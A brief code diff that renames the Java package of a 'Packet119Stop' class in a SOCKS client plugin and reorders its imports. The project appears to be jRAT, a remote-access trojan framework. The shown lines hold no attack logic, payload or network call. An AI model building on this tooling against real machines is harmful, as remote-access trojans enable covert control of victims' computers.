@@ -1,11 +1,11 @@
-package se.jrat.plugin.socks.client;
+package jrat.plugin.socks.client;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
-import se.jrat.plugins.socks.Global;
 import jrat.api.Client;
 import jrat.api.net.PacketBuilder;
+import jrat.plugins.socks.Global;
 
 public class Packet119Stop extends PacketBuilder {
 
